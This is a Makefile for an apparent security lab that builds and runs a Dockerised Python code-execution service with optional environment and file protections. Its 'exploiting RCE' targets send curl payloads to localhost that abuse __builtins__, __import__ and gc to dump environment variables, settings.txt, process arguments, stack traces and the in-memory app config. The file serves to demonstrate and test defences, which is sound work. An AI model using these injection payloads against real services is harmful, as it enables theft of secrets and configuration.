
.DEFAULT_GOAL:=help
.PHONY: help build shell run run-protect-env run-protect-file server-read-env server-read-settings server-read-process server-read-stack server-read-inmem-config

# Help menu target from: https://blog.thapaliya.com/posts/well-documented-makefiles/
help:  ## Display this help
	@awk 'BEGIN {FS = ":.*##"; printf "\nUsage:\n  make \033[36m<target>\033[0m\n"} /^[a-zA-Z_-]+:.*?##/ { printf "  \033[36m%-15s\033[0m %s\n", $$1, $$2 } /^##@/ { printf "\n\033[1m%s\033[0m\n", substr($$0, 5) } ' $(MAKEFILE_LIST)

build: ## Build the docker image
	docker build -t code-exec .

##@ Run container with various protections

shell: ## Open a shell in the container
	docker run -it code-exec /bin/sh

run: ## Run the image with no protections
	docker run --init --env-file example.env --publish 5000:5000 code-exec

run-protect-env: ## Run the image with env protection
	docker run --init --env-file example.env --env ENV_PROTECTION=true --publish 5000:5000 code-exec

run-protect-file: ## Run the image with env and file protection
	docker run --init --env-file example.env --env ENV_PROTECTION=true --env FILE_PROTECTION=true --publish 5000:5000 code-exec

##@ Targets exploiting RCE

server-read-env: ## CURL exfiltrating shell environment variables
	@curl --location \
		--request POST 'http://localhost:5000/' \
		--header 'Content-Type: text/plain' \
		--data-raw '"{}\n".format(__builtins__["__import__"]("os").environ)'

server-read-settings: ## CURL exfiltrating settings file content
	@curl --location \
		--request POST 'http://localhost:5000/' \
		--header 'Content-Type: text/plain' \
		--data-raw '"{}\n".format(open("settings.txt", "r").read())'

server-read-process: ## CURL exfiltrating process CLI arguments
	@curl --location \
		--request POST 'http://localhost:5000/' \
		--header 'Content-Type: text/plain' \
		--data-raw '"{}\n".format(__builtins__["__import__"]("sys").argv)'

server-read-stack: ## CURL exfiltrating stacktrace from RCE point
	# Gets a stacktrace to show where we're getting code execution
	@curl --location \
		--request POST 'http://localhost:5000/' \
		--header 'Content-Type: text/plain' \
		--data-raw '"{}\n".format("".join(__builtins__["__import__"]("traceback").StackSummary.extract(__builtins__["__import__"]("traceback").walk_stack(None)).format()))'

server-read-inmem-config: ## CURL exfiltrating the config of the WSGI app instance
	# Abuses pythons gc lib to find the WSGI instance and inspecting it
	curl --location \
		--request POST 'http://localhost:5000/' \
		--header 'Content-Type: text/plain' \
		--data-raw '"{}\n".format([ x for x in __builtins__["__import__"]("gc").get_objects() if isinstance(x, CodeExecService) ][0].__dict__)'
